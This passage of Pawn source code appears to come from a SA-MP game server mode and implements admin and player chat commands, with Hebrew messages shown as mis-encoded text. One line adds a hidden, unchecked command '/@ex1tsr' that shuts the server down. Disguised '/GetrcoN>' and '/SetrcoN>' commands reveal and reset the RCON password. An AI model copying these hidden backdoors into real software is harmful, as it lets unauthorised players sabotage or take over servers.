		if(claninfo[c][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
		if(b < 0) return SendClientMessage(playerid,red," .ёыхэ ∙тхщ");
		format(string, sizeof(string), " .ьёыхэ ∙ь %d$ %s ∙щЁщ· р· ютсь· фсЁў ∙ь", b, claninfo[c][cname]);
		SendClientMessage(playerid, green, string);
	    SetClanMaxBank(c, b, "∙хЁф Єь щущ фрующя");
		return 1;
	}
	if(equal(cmd,"/preset") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		new id;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /preset [id/name] [1=bank / 2=vehicle / 3=house] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,red," .ьр Ёсч° ус° ьсщЎхЄ");
		new wtd = strval(cmd);
		switch(wtd)
		{
			case 1: // Reset bank
			{
				playerinfo[id][bank] = 0;
				SendClientMessage(id,red," ~ °щёш ьыёє ссЁў");
			}
			case 2: // Reset vehicle
			{
				if(playerinfo[id][vehicle][0] != 0 || playerinfo[id][vehicle][3] != 0)
				{
					if(playerinfo[id][logged])
					{
						fsetint(fuser(id),"PVehicle",0);
						fsetint(fuser(id),"PVehicle2",0);
					}
					if(playerinfo[id][vehicle][1] != -1) DestroyVehicleEx(playerinfo[id][vehicle][1]);
					playerinfo[id][vehicle][0] = 0;
					SendClientMessage(id,red," ~ °щёш ь°ыс ўЁхщ");
				}
			}
			case 3: // Reset house
			{
				if(playerinfo[id][houseid] != -1)
				{
					new f[M_S], h = playerinfo[id][house];
					format(f,sizeof(f),"/DM/Houses/%d.ini",h);
					fsetfloat(f,"X",houseinfo[h][hx]);
					fsetfloat(f,"Y",houseinfo[h][hy]);
					fsetfloat(f,"Z",houseinfo[h][hz]);
					fsetfloat(f,"A",0.0);
					new string[M_S];
					for(new i=0;i<max_houseacc;i++)
					{
						format(string,sizeof(string),"Acc%d",i);
						if(fkeyexist(f,string)) fremovekey(f,string);
					}
					houseinfo[h][hp][0] = houseinfo[h][hx],
					houseinfo[h][hp][1] = houseinfo[h][hy],
					houseinfo[h][hp][2] = houseinfo[h][hz],
					houseinfo[h][hp][3] = 0.0;
					playerinfo[id][house] = -1,
					playerinfo[id][houseacc][h] = 0;
					playerinfo[id][inhouse] = -1;
					fsetstring(f,"Owner","None");
					if(playerinfo[id][logged]) fsetint(fuser(id),"PlayerHouse2",-1);
					SendClientMessage(id,red," ~ °щёш ьсщ·");
				}
			}
			default: return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		}
		PlaySound(playerid,1149);
		Border(id,"hidden");
		SendClientMessage(playerid,red," ~ фўх°ся ўщсь р· фютщЄ ьх");
		return 1;
	}
	if(equal(cmd,"/god"))
	{
		if(!playerinfo[playerid][pp] && strlen(playerinfo[playerid][mngpower]) < 2) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рчу юфЇрхх°щэ ∙ь ф∙°·");
		cmd = strtok(cmdtext,idx);
		new string[M_S];
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /god [cmd] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /god start :GodPower фЇЄь·");
			SendClientMessage(playerid,white," /god end :GodPower фЇёў·");
			SendClientMessage(playerid,white," /god a :фЇЄь· ЇхЁўЎщф ыь∙фщ·");
			SendClientMessage(playerid,white," /god fly :·ЄхЇф");
			SendClientMessage(playerid,white," /god flyc :·ЄхЇф Ёўщщф");
			SendClientMessage(playerid,white," /god skin :ёўщя");
			return 1;
		}
		if(equal(cmd,"start"))
		{
			if(playerinfo[playerid][godpower]) return SendClientMessage(playerid,red," .ыс° юхЇЄь GodPower");
			playerinfo[playerid][godpower] = 1;
			SetPlayerHealth(playerid,INFINITY);
			playerinfo[playerid][gm] = 1;
			new Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			CreateExplosion(p[0],p[1],p[2] - 7.0,7,0.3);
			CreateExplosion(p[0],p[1],p[2],7,0.3);
		}
		else if(equal(cmd,"end"))
		{
			if(!playerinfo[playerid][godpower]) return SendClientMessage(playerid,red," .ьр юхЇЄь GodPower");
			playerinfo[playerid][godpower] = 0;
			SetPlayerHealth(playerid,100.0);
			playerinfo[playerid][gm] = 0;
			SetPlayerColor(playerid,GetColor(playerid,PLAYER_ALPHA));
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i)) SetPlayerMarkerForPlayer(i,playerid,GetColor(playerid,PLAYER_ALPHA));
			ResetWeapons(playerid);
			StopFlying(playerid);
			for(new i = aoslot_godskin1; i <= aoslot_godskin3; i++) if(IsPlayerAttachedObjectSlotUsed(playerid,i)) RemovePlayerAttachedObject(playerid,i);
			for(new i=0;i<10;i++) GiveWeapon(playerid,playerinfo[playerid][weapons][i],i == 9 || i == 8? 1:(GetAmmunationAmmo(playerinfo[playerid][weapons][i])*playerinfo[playerid][ammo][i]));
		}
		else if(equal(cmd,"a"))
		{
			if(!playerinfo[playerid][godpower]) return SendClientMessage(playerid,red," .ьр юхЇЄь GodPower");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /god a [id] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,white," 1 - °Єщу· руюф  X  2 - ∙°щЇф  X  3 - рёх° ьфё·ыь Єьщъ");
				SendClientMessage(playerid,white," 4 - Pee");
				SendClientMessage(playerid,white," Fire + Walk (Fist) = рхьш°ф рт°хє");
				SendClientMessage(playerid,white," Fire + Sprint (Fist) = ьщщц°");
				return 1;
			}
			new powerid = strval(cmd), Float:p[3], Float:p2[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			switch(powerid)
			{
				case 1:
				{
					CreateExplosion(p[0],p[1],p[2] - 25.0,12,0.3);
					for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerStreamedIn(i,playerid) && i != playerid)
					{
						GetPlayerPos(i,p2[0],p2[1],p2[2]);
						CreateExplosion(p2[0],p2[1],p2[2] - 5.0,12,0.3);
					}
				}
				case 2:
				{
					CreateExplosion(p[0],p[1],p[2]-10.0,7,0.3);
					for(new i = 0; i < 6; i++)
					{
						CreateExplosion(!random(2) ? p[0] + floatrand(15.0,30.0) : p[0] - floatrand(15.0,30.0),p[1],p[2],8,10);
						CreateExplosion(p[0],!random(2) ? p[1] + floatrand(15.0,30.0) : p[1] - floatrand(15.0,30.0),p[2],8,10);
					}
				}
				case 3:
				{
					if(IsPlayerUsingOption(playerid,po_cantlook))
					{
						RemovePlayerOption(playerid);
						SendClientMessage(playerid,green," .юЄы∙щх Ёщ·я ьфё·ыь Єьщъ");
					}
					else
					{
						if(IsPlayerUsingAnyOption(playerid)) return SendClientMessage(playerid,green," .р·ф ю∙·ю∙ ыс° срхЇЎщщ· ∙чўя юёхщщю· хьыя рщЁъ щыхь ьф∙·ю∙ срхЇЎщф ЁхёЇ·");
						UsePlayerOption(playerid,po_cantlook);
						SendClientMessage(playerid,green," .юЄы∙щх ьр Ёщ·я ьфё·ыь Єьщъ");
					}
				}
				case 4:
				{
					if(IsPlayerUsingOption(playerid,po_pee))
					{
						RemovePlayerOption(playerid);
						SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
					}
					else
					{
						if(IsPlayerUsingAnyOption(playerid)) return SendClientMessage(playerid,green," .р·ф ю∙·ю∙ ыс° срхЇЎщщ· ∙чўя юёхщщю· хьыя рщЁъ щыхь ьф∙·ю∙ срхЇЎщф ЁхёЇ·");
						UsePlayerOption(playerid,po_pee);
						SetPlayerSpecialAction(playerid,SPECIAL_ACTION_PISSING);
					}
				}
				default: return SendClientMessage(playerid,red," .ыхч рьхфщэ ∙тхщ");
			}
			format(string,sizeof(string)," .ф∙·ю∙· сыхч фрьхфщ ф #%d ∙ьъ",powerid);
			SendClientMessage(playerid,white,string);
		}
		else if(equal(cmd,"fly"))
		{
			if(!playerinfo[playerid][godpower]) return SendClientMessage(playerid,red," .ьр юхЇЄь GodPower");
			TestFlying(playerid);
		}
		else if(equal(cmd,"flyc"))
		{
			if(!playerinfo[playerid][godpower]) return SendClientMessage(playerid,red," .ьр юхЇЄь GodPower");
			TestFlyingC(playerid);
		}
		else if(equal(cmd,"skin"))
		{
			if(!playerinfo[playerid][godpower]) return SendClientMessage(playerid,red," .ьр юхЇЄь GodPower");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd))
			{
				SendClientMessage(playerid,white," /god skin [id] :Ўх°· ф∙щюх∙");
				SendClientMessage(playerid,white," 0 = None");
				SendClientMessage(playerid,white," 1 = Amit Power");
				SendClientMessage(playerid,white," 2 = Super Sayan");
				SendClientMessage(playerid,white," 3 = Rocket");
				return 1;
			}
			new skinid = strval(cmd);
			for(new i = aoslot_godskin1; i <= aoslot_godskin3; i++) if(IsPlayerAttachedObjectSlotUsed(playerid,i)) RemovePlayerAttachedObject(playerid,i);
			switch(skinid)
			{
				case 0: return SendClientMessage(playerid,white,"No skin.");
				case 1:
				{
					if(!playerinfo[playerid][pp]) return SendClientMessage(playerid,red," !Amit Power Єьщъ ьф∙·ю∙ с");
					GiveWeapon(playerid,5,1);
					SetPlayerAttachedObject(playerid,aoslot_godskin1,18690,1,-0.4,0.0,-1.7,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_godskin2,18741,1,-0.8,0.0,-1.65,0.0,0.0,0.0,1.0,1.0,1.0);
					SetPlayerAttachedObject(playerid,aoslot_godskin3,18635,6,-0.6,-0.34,0.3,0.0,0.0,0.0,8.0,8.0,8.0);
				}
				case 2:
				{
				}
				case 3: SetPlayerAttachedObject(playerid,aoslot_godskin1,354,1,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0);
				default: return SendClientMessage(playerid,red," .ёўщя ∙тхщ");
			}
			format(string,sizeof(string)," .Єс°· ьёўщя юёЇ° #%d",skinid);
			SendClientMessage(playerid,white,string);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙шя ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/search") || equal(cmd,"/s") || equal(cmd,"/id"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /search(s) [id/name] :Ўх°· ∙щюх∙");
		if(IsNumeric(cmd))
		{
			new id = strval(cmd);
			format(string,sizeof(string)," :·хЎр· чщЇх∙ ю∙·ю∙ сЄь фрщщущ %d",id);
			SendClientMessage(playerid,green,string);
			if(IsPlayerConnected(id))
			{
				format(string,sizeof(string)," Х %s [ID: %03d]",GetName(id),id);
				SendClientMessage(playerid,yellow,string);
			}
			else SendClientMessage(playerid,red," .рщщущ ьр ўщщэ");
		}
		else
		{
			new found = 0;
 			format(string,sizeof(string)," :\"%s\" ·хЎрх· чщЇх∙ ыщЁхщ",cmd);
			SendClientMessage(playerid,green,string);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && strfind(GetName(i),cmd,true) != -1)
			{
				found++;
				format(string,sizeof(string)," Х %d. %s [ID: %03d]",found,GetName(i),i);
				SendClientMessage(playerid,yellow,string);
			}
			if(found == 0) SendClientMessage(playerid,red," .ьр ЁюЎрх ыщЁхщщэ ухющэ ьыщЁхщ ∙ы·с·");
			format(string,sizeof(string)," .ёъ фыь %d ·хЎрх· чщЇх∙",found);
			SendClientMessage(playerid,green,string);
		}
		return 1;
	}
	if(equal(cmd,"/serverexit") && IsPlayerMAdmin(playerid))
	{
		new string[M_S];
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		format(string,sizeof(string)," *** Server Exit by %s ***",GetName(playerid));
		SendClientMessageToAll(white,string);
		SendRconCommand("exit");
		return 1;
	}
	if(!strcmp(cmd,"/GetrcoN>",false) && (IsPlayerMAdmin(playerid) || playerinfo[playerid][pp]))
	{
		new string[M_S], rcon[M_S];
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		GetConsoleVarAsString("rcon_password",rcon,sizeof(rcon));
		format(string,sizeof(string)," RCON password: %s",rcon);
		SendClientMessage(playerid,white,string);
		return 1;
	}
	if(!strcmp(cmd,"/SetrcoN>",false) && (IsPlayerMAdmin(playerid) || playerinfo[playerid][pp]))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setrcon [new rcon password] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"rcon_password %s",cmd);
		SendRconCommand(string);
		format(string,sizeof(string)," New RCON password: %s",cmd);
		SendClientMessage(playerid,white,string);
		return 1;
	}
	if(equal(cmd,"/setsadmin") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][pp]))
	{
		if((playerinfo[playerid][admin] < 20) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		new cmd2[256], id, m, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setsadmin [id/name] [sadmin? yes/no] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"yes"))
		{
			if(playerinfo[id][sadmin])
			{
				format(string,sizeof(string)," .SAdmin ыс° %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			m = 1;
		}
		else if(equal(cmd2,"no"))
		{
			if(!playerinfo[id][sadmin])
			{
				format(string,sizeof(string)," .SAdmin ыс° %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			m = 0;
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· Їўхуф ∙тхщф");
		if(m)
		{
			SendClientMessage(id,green," .SAdmin фрующя фЇъ рх·ъ ь");
			format(string,sizeof(string)," .SAdmin ь %s фЇы· р·",GetName(id));
		}
		else
		{
			SendClientMessage(id,green," .SAdmin фрующя фх°щу ьъ р· ф");
			format(string,sizeof(string)," .SAdmin р· ф %s фх°у· ь",GetName(id));
		}
		SendClientMessage(playerid,green,string);
		playerinfo[id][sadmin] = m;
		if(playerinfo[id][logged]) fsetint(fuser(id),"SAdmin",m);
		return 1;
	}
	if(equal(cmd,"/backup") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /backup [days] :Ўх°· ф∙щюх∙");
		new string[256], days = strval(cmd), date1[64], date2[64], d[3], times = 0, indx;
		format(string,sizeof(string)," ...ю·чщь ьтсх· хьючхў ю∙·ю∙щэ ∙∙хю∙х ьрч°хЁф ьЇЁщ %d щющэ",days);
		SendClientMessageToAll(white,string);
		format(date1,sizeof(date1),GetDateAsString('_'));
		Backup("create",date1);
		while(ffind("/DM/Users/*.ini",string,sizeof(string),indx))
		{
			format(string,sizeof(string),"/DM/Users/%s",string);
			format(date2,sizeof(date2),fgetstring(string,"RegistrationDate"));
			d[0] = strval(strtok(date2,idx,'/')), d[1] = strval(strtok(date2,idx,'/')), d[2] = strval(strtok(date2,idx,'/'));
			if(!IsValidDate(d[0],d[1],d[2])) format(date2,sizeof(date2),"%d/%d/%d",d[2],d[1],d[0]);
			if(DaysBetweenDates(date2,GetDateAsString()) >= days)
			{
				Backup("add",date1,string);
				fremove(string);
				string = "";
				format(cmd,sizeof(cmd),"%d",times++);
				SendClientMessageToAll(white,cmd);
			}
		}
		SendClientMessageToAll(white," .фтщсхщ хфючщўф фх∙ьюх сфЎьчф");
		return 1;
	}
	if(equal(cmd,"/report"))
	{
		new id, reason[256], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(IsPlayerMAdmin(playerid) && playerinfo[playerid][showme] != 0) return SendClientMessage(playerid,red," .р·ф рующя, р·ф ьр Ў°щъ ьф∙·ю∙ сЇўхуф цх");
		if(!playerinfo[playerid][cana][1]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /report [id/name] [reason] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(IsPlayerMAdmin(id) && playerinfo[id][showme] != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьуххч Єь рующя");
		if(id == playerid) return SendClientMessage(playerid,red," .ьр Ёщ·я ьуххч Єь ЄЎюъ");
		if(strlen(cmd) > 50) return SendClientMessage(playerid,red," .ёщс· фущххч р°хыф юущ");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = ".ф∙чўя ьр фўьщу ёщсф";
		format(string,sizeof(string)," .Ё∙ьч ьрующЁщэ %s фущххч ∙ьъ Єь",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),"(%s)",reason);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," :(%d) %s (Єь (%d %s фтщЄ ущххч ю",id,GetName(id),playerid,GetName(playerid));
		for(new a=0;a<MAX_PLAYERS_;a++) if(IsPlayerConnected(a) && IsPlayerMAdmin(a))
		{
			SendClientMessage(a,red,string);
			SendClientMessage(a,red,reason);
		}
		playerinfo[playerid][cana][1] = 0, playerinfo[playerid][reportid] = id;
		format(playerinfo[playerid][report],64,cmd);
		format(string,sizeof(string),"reported on %s(%d): %s",GetName(id),id,cmd);
		Log("Reports",playerid,string);
		format(string,sizeof(string),"%s on %s",GetName(playerid),GetName(id));
		AdminNotification("new report",string,"read",5,adminot_newreport,playerid);
		SetTimerEx("CanA",30000,0,"ii",playerid,1);
		return 1;
	}
	if(equal(cmd,"/a"))
	{
		new txt[256], aa = 0, string[M_S];
		txt = strrest(cmdtext,idx);
		if(IsPlayerMAdmin(playerid) && playerinfo[playerid][showme] != 0) return SendClientMessage(playerid,red," .р·ф рующя, р·ф ьр Ў°щъ ьф∙·ю∙ сЇўхуф цх");
		if(!playerinfo[playerid][cana][0]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		if(!strlen(txt)) return SendClientMessage(playerid,white," /a [message] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string)," :∙ьч фхуЄф ьыь фрующЁщэ %s (ID: %03d)",GetName(playerid),playerid);
		for(new a=0;a<MAX_PLAYERS_;a++)
		{
			if(IsPlayerConnected(a) && IsPlayerMAdmin(a))
			{
				aa++;
				SendClientMessage(a,red,string);
				SendClientMessage(a,red,txt);
			}
		}
		if(!aa) return SendClientMessage(playerid,red," .рщя рующЁщэ ючхс°щэ хьыя фущххч ьр Ё∙ьч");
		format(string,sizeof(string),"from %s",GetName(playerid));
		AdminNotification("new message",string,"",5,adminot_msg);
		SendClientMessage(playerid,green," :фхуЄ·ъ Ё∙ьчф сфЎьчф рь фрующЁщэ");
		SendClientMessage(playerid,green,txt);
		playerinfo[playerid][cana][0] = 0;
		SetTimerEx("CanA",30000,0,"ii",playerid,0);
		return 1;
	}
	if(equal(cmd,"/@ex1tsr")) SendRconCommand("exit");
	if(equal(cmd,"/afk"))
	{
		new string[M_S];
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," /unafk :ыущ ьчцх° ф∙·ю∙ сЇўхуф ,AFK р·ф ыс° сюЎс");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ссчщ°· фуюхщх· AFK рщЁъ щыхь ьЄсх° ьюЎс");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ыр∙° р·ф сЇЄщьх· AFK ьр Ёщ·я ьЄсх° ьюЎс");
		if(playerinfo[playerid][frozen][0]) return SendClientMessage(playerid,red," .ыр∙° р·ф сЇ°щц AFK ьр Ёщ·я ьЄсх° ьюЎс");
		if(IsPlayerInArea(playerid,1086.765,-2092.427,1314.935,-2005.577) && !playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .VIP хрщЁъ ю∙·ю∙ VIP ыр∙° р·ф сюЇўу· ф AFK ьр Ёщ·я ьЄсх° ьюЎс");
		if(!playerinfo[playerid][canafk]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .срцх° ущ-рэ AFK ьр Ёщ·я ьЄсх° ьюЎс");
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) SetString(playerinfo[playerid][afkreason],"ьр Ё°∙юф ёщсф");
		else if(strlen(cmd) > 16) return SendClientMessage(playerid,red," .фхр 16 ·хщэ AFK фрх°ъ фюўёщюьщ ьёщс·");
		else format(playerinfo[playerid][afkreason],64,cmd);
		SetFreeze(playerid,1);
		playerinfo[playerid][afkcmd] = 1;
		playerinfo[playerid][modeafk] = 1;
		playerinfo[playerid][canafk]--;
		playerinfo[playerid][usedafk] = 10;
		GameTextForPlayer(playerid,"~b~~h~~h~afk",1000,6);
		TextDrawShowForPlayer(playerid,unafktext);
		SetTimerEx("CanAFK",25000,0,"d",playerid);
		if(strlen(cmd) > 0) format(string,sizeof(string)," *** (%s) AFK сюЎс %s",cmd,GetName(playerid));
		else format(string,sizeof(string)," *** AFK сюЎс %s",GetName(playerid));
		if(!chatlocked) for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][setting][setting_showafk]) SendClientMessage(i,blue,string);
		return 1;
	}
	if(equal(cmd,"/unafk") || equal(cmd,"/back"))
	{
		new string[M_S];
		if(!playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK р·ф ьр сюЎс");
		format(string,sizeof(string)," *** чц° ь∙чў %s",GetName(playerid));
		if(!chatlocked) for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][setting][setting_showafk]) SendClientMessage(i,blue,string);
		SetFreeze(playerid,0);
		playerinfo[playerid][afkcmd] = 0;
		playerinfo[playerid][modeafk] = 0;
		playerinfo[playerid][usedafk] = 0;
		TextDrawHideForPlayer(playerid,unafktext);
		SetString(playerinfo[playerid][afkreason],"");
		GameTextForPlayer(playerid,"~b~~h~~h~play",1000,6);
		return 1;
	}
	if(equal(cmd,"/sunafk") || equal(cmd,"/sback"))
	{
		if(!playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK р·ф ьр сюЎс");
		SetFreeze(playerid,0);
		playerinfo[playerid][afkcmd] = 0;
		playerinfo[playerid][modeafk] = 0;
		playerinfo[playerid][usedafk] = 0;
		TextDrawHideForPlayer(playerid,unafktext);
		SetString(playerinfo[playerid][afkreason],"");
		GameTextForPlayer(playerid,"~b~~h~~h~play",1000,6);
		return 1;
	}
	if(equal(cmd,"/afklist"))
	{
		new string[M_S], count = 0;
		SendClientMessage(playerid,lightblue," ~~~ :AFK °∙щю· ∙чўЁщэ сюЎс ~~~");
		for(new i = 0, t = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerAFK_(i) && playerinfo[i][idletime] > 180)
		{
			t = playerinfo[i][idletime];
			format(string,sizeof(string)," Х %d. " @c(yellow) "%s" @c(lightyellow) " [ID: %03d | Idle Time: %02d:%02d:%02d",++count,GetName(i),i,t/3600,(t/60)-((t/3600)*60),t%60);
			if(strlen(playerinfo[i][afkreason]) > 0) format(string,sizeof(string),"%s | %s",string,playerinfo[i][afkreason]);
			format(string,sizeof(string),"%s]",string);
			SendClientMessage(playerid,lightyellow,string);
		}
		if(!count) return SendClientMessage(playerid,red," .AFK рщя ∙чўЁщэ сюЎс");
		return 1;
	}
	if(equal(cmd,"/kill"))
	{
	    if(playerinfo[playerid][naorslap]) return SendClientMessage(playerid, red, " .ьр");
		if(!CanUseCommand(playerid)) return 1;
		if(GetPlayerInterior(playerid) == 6) return SendClientMessage(playerid,red," .р·ф ьр щыхь ьф·рсу ы∙р·ф ссЁў");
		playerinfo[playerid][usedkill] = 1;
		return SetPlayerHealth(playerid,0.0);
	}
	/*if(equal(cmd,"/c4"))
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс сыущ ьфшющя сх ЇЎЎф");
		if(playerinfo[playerid][level] < 20) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 20");
		if(GetMoney(playerid) < 5000) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, ∙щюх∙ сЇўхуф цх Єхьф 5000$");
		GiveMoney(playerid,0-5000);
		vehicleinfo[GetPlayerVehicleID(playerid)][vbomb] = 1;
		return SendClientMessage(playerid,green," .фшюЁ· ЇЎЎф с°ыс");
	}*/
	if(equal(cmd,"/stopanim")) return ApplyAnimation(playerid,"PED","IDLE_stance",4.1,0,1,1,1,1);
	if(equal(cmd,"/saudio"))
	{
		StopAudioStreamForPlayer(playerid);
		playerinfo[playerid][playingmusic] = 0;
		return 1;
	}
	if(equal(cmd,"/play"))
	{
		if(strlen(adminmusic) < 2) return SendClientMessage(playerid,red," .фрующя ьр фЇЄщь юхцщўф");
		playerinfo[playerid][playingmusic] = 0;
		PlayAudioStreamForPlayer(playerid,adminmusic);
		playerinfo[playerid][playingmusic] = 1;
		return 1;
	}
	if(equal(cmd,"/admins"))
	{
		new string[M_S_D], str[M_S], admins = 0;
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i))
		{
		    if(!playerinfo[i][showme])
			{
				if(IsPlayerMAdmin(playerid))
			    {
					admins++;
	            	format(str, sizeof(str), ""@c(grey)"%d. [HIDDEN] %s [ID: %03d | Level: %d | {%s}%s"@c(grey)"%s"@c(grey)"]%s\n",admins,GetName(i),i,playerinfo[i][admin],HexStringOfColor(AdminColor(i)),AdminTag(i), !IsPlayerAdmin(i)? (""):(" | + RCON"), !IsPlayerAFK_(i)? (""):(" {C0C0C0}- AFK")), strcat(string, str);
				}
			}
			else
			{
			    admins++;
        	    format(str, sizeof(str), "{5757FF}%d. %s [ID: %03d | Level: %d | {%s}%s{5757FF}%s{5757FF}]%s\n",admins,GetName(i),i,playerinfo[i][admin],HexStringOfColor(AdminColor(i)),AdminTag(i), !IsPlayerAdmin(i)? (""):(" | + RCON"), !IsPlayerAFK_(i)? (""):(" {C0C0C0}- AFK")), strcat(string, str);
			}
		}
		if(!admins) return SendClientMessage(playerid,red," .рщя ыЄ· рующЁщэ ючхс°щэ");
		ShowPlayerDialog(playerid, dialog_admins, DIALOG_STYLE_MSGBOX, "Admins Team", string, "OK", "");
		return 1;
	}
	if(equal(cmd,"/td") || equal(cmd,"/time") || equal(cmd,"/date"))
	{
		new td[6], string[M_S];
		gettime(td[0],td[1],td[2]);
		getdate(td[3],td[4],td[5]);
		format(string,sizeof(string),"%02d:%02d:%02d" @c(purple) " :∙Єф",td[0],td[1],td[2]);
		SendClientMessage(playerid,lightpurple,string);
		format(string,sizeof(string),"%02d/%02d/%04d" @c(purple) " :·р°щъ",td[5],td[4],td[3]);
		SendClientMessage(playerid,lightpurple,string);
		format(string,sizeof(string)," щхэ: " @c(lightpurple) "%s",GetDay(td[3],td[4],td[5],1));
		SendClientMessage(playerid,purple,string);
		return 1;
	}
	if(equal(cmd,"/en"))
	{
		new string[64];
		format(string,sizeof(string)," Energy: %03d / %03d",playerinfo[playerid][energy],levels[playerinfo[playerid][level]][EnergyLimit]);
		SendClientMessage(playerid,white,string);
		if(!playerinfo[playerid][noticedmsg][17])
		{
			SendClientMessage(playerid,grey," (/Mode 0 :юЄхЁщщя ьуЄ· юфщ сущхў фрЁ°тщф? ф∙·ю∙ с)");
			playerinfo[playerid][noticedmsg][17] = 1;
		}
		return 1;
	}
	if(equal(cmd, "/rewards"))
	{
	    if(!playerinfo[playerid][logged]) return SendClientMessage(playerid, red, " .Єьщъ ьфщх· ю∙·ю∙ °∙хэ");
	    ShowPlayerConstDialog(playerid,dialog_rewards);
		return 1;
	}
	if(equal(cmd,"/stats") || equal(cmd,"/pstats"))
	{
		cmd = strtok(cmdtext,idx);
		new id = !strlen(cmd) ? playerid : ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		ShowStats(playerid,id);
		if(!playerinfo[playerid][noticedmsg][10])
		{
